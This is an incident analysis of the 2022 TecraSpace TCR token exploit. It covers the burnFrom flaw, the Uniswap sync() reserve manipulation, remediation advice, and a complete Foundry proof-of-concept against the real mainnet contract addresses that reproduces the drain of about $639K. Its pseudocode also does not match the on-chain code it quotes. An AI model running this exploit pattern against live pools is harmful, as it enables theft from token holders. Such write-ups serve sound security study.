# TecraSpace — burnFrom Price Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-02-18 |
| **Protocol** | TecraSpace (TCR Token) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$639,222 (USDT) |
| **Attacker** | [0xb19b7f59c08ea447f82b587c058ecbf5fde9c299](https://etherscan.io/address/0xb19b7f59c08ea447f82b587c058ecbf5fde9c299) |
| **Attack Contract** | [0x6653d9bcbc28fc5a2f5fb5650af8f2b2e1695a15](https://etherscan.io/address/0x6653d9bcbc28fc5a2f5fb5650af8f2b2e1695a15) |
| **Vulnerable Contract** | TCR [0xE38B72d6595FD3885d1D2F770aa23E94757F91a1](https://etherscan.io/address/0xE38B72d6595FD3885d1D2F770aa23E94757F91a1) |
| **Root Cause** | Used `burnFrom()` to burn TCR from the Uniswap pool, then called `sync()` to force-update pool reserves, manipulating the TCR/USDT spot price to extract arbitrage profit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-02/TecraSpace_exp.sol) |

---
## 1. Vulnerability Overview

The TCR token implemented a `burnFrom(address account, uint256 amount)` function. This function could **burn TCR directly from the Uniswap V2 liquidity pool address** either without allowance validation or with insufficient validation.

Attack flow: 1) Acquire a small amount of TCR via ETH → USDT → TCR swaps, 2) Burn a large amount of TCR from the Uniswap pool using `burnFrom()`, 3) Force-update pool reserves via `sync()` (reserves decrease → TCR price spikes), 4) Swap held TCR back to USDT to realize the price manipulation profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable TCR token burnFrom (pseudocode)
contract TCRToken is ERC20 {

    // ❌ No allowance validation, or callable from the pair address
    function burnFrom(address account, uint256 amount) public {
        // ❌ msg.sender allowance check missing or bypassable
        _burn(account, amount);
    }
}

// Uniswap V2 Pair sync()
function sync() external lock {
    // ❌ If pair balance decreases due to external burn, sync() updates reserves to the lower value
    // → Spot price changes immediately, not TWAP
    _update(
        IERC20(token0).balanceOf(address(this)),  // reduced balance after burn
        IERC20(token1).balanceOf(address(this)),
        reserve0,
        reserve1
    );
}

// ✅ Correct burnFrom pattern
function burnFrom(address account, uint256 amount) public {
    // ✅ Allowance must be validated
    uint256 currentAllowance = allowance(account, msg.sender);
    require(currentAllowance >= amount, "ERC20: burn amount exceeds allowance");
    unchecked {
        _approve(account, msg.sender, currentAllowance - amount);
    }
    _burn(account, amount);
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**TcrToken.sol** — Entry point:
```solidity
// ❌ Root cause: `burnFrom()` burns TCR from the Uniswap pool, then `sync()` force-updates pool reserves, manipulating TCR/USDT price to extract arbitrage profit
    function burnFrom(address from, uint256 amount) external {  // ❌ Vulnerability
        require(_allowances[msg.sender][from] >= amount, ERROR_ATL);
        require(_balances[from] >= amount, ERROR_BTL);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        _burn(from, amount);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (starting with 0.04 ETH)
    │
    ├─[1] ETH → USDT (UniswapV2, swapExactETHForTokens)
    │
    ├─[2] USDT → TCR (UniswapV2, swapExactTokensForTokens)
    │       Acquire small amount of TCR
    │
    ├─[3] TCR.burnFrom(Pair Pool, pool_balance - 100_000_000)
    │       ⚡ Burn large amount of TCR from pool
    │       Bypass allowance validation
    │
    ├─[4] Pair.sync()
    │       Update pool reserves:
    │       reserve_TCR ↓↓ → TCR spot price ↑↑ (sharp increase)
    │
    ├─[5] Held TCR → USDT (swapExactTokensForTokens)
    │       Swap at manipulated inflated TCR price
    │       → Acquire large amount of USDT
    │
    └─[6] Net profit: ~$639,222 USDT
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface ITCR is IERC20 {
    // ⚡ Vulnerable function: allows burning TCR from the pair address
    function burnFrom(address account, uint256 amount) external;
}

interface IUniswapV2Pair {
    function sync() external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract ContractTest is Test {
    ITCR TCR = ITCR(0xE38B72d6595FD3885d1D2F770aa23E94757F91a1);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IUniswapV2Router router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Pair pair = IUniswapV2Pair(0x420725A69E79EEffB000F98Ccd78a52369b6C5d4);

    function setUp() public {
        vm.createSelectFork("mainnet", 14_139_081);
        vm.deal(address(this), 0.04 ether);
    }

    function testExploit() public {
        // [Step 1] ETH → USDT
        address[] memory path1 = new address[](2);
        path1[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
        path1[1] = address(USDT);
        router.swapExactETHForTokens{value: 0.04 ether}(0, path1, address(this), block.timestamp);

        // [Step 2] USDT → TCR
        USDT.approve(address(router), type(uint256).max);
        address[] memory path2 = new address[](2);
        path2[0] = address(USDT);
        path2[1] = address(TCR);
        router.swapExactTokensForTokens(
            USDT.balanceOf(address(this)), 0, path2, address(this), block.timestamp
        );

        // [Step 3] Burn large amount of TCR from pool → reduce reserves
        uint256 poolTCR = TCR.balanceOf(address(pair));
        TCR.burnFrom(address(pair), poolTCR - 100_000_000); // burn all but 100M

        // [Step 4] Force-update pool reserves via sync() → TCR price spikes
        pair.sync();

        // [Step 5] Swap held TCR to USDT at the manipulated inflated price
        TCR.approve(address(router), type(uint256).max);
        address[] memory path3 = new address[](2);
        path3[0] = address(TCR);
        path3[1] = address(USDT);
        router.swapExactTokensForTokens(
            TCR.balanceOf(address(this)), 0, path3, address(this), block.timestamp
        );

        emit log_named_decimal_uint("[Profit] USDT gained", USDT.balanceOf(address(this)), 6);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Price Manipulation via burnFrom |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | AMM Reserve Manipulation |
| **Attack Vector** | Burn LP pool balance via burnFrom → sync() → price manipulation |
| **Precondition** | burnFrom callable from the pair address |
| **Impact** | Unlimited AMM price manipulation |

---
## 6. Remediation Recommendations

1. **Strict burnFrom allowance validation**: Allowance must always be checked and decremented.
2. **LP pool address blacklist**: Block the burn function from targeting LP pool addresses.
3. **Use TWAP**: Protocols that use TWAP (Time-Weighted Average Price) instead of spot price are resistant to single-transaction manipulation.
4. **Monitor direct reserve changes**: Add a protection mechanism that reverts the transaction if reserves change significantly before `sync()`.

---
## 7. Lessons Learned

- **Dangers of burnFrom**: `burnFrom` is a powerful ERC20 feature, but if it allows burning from arbitrary addresses without allowance, it becomes a tool for AMM manipulation.
- **Design of sync()**: Uniswap V2's `sync()` is intended to synchronize reserves when tokens are added or removed externally, but it can be abused.
- **$639K loss**: Though a smaller-scale attack, the same pattern could cause significantly greater damage.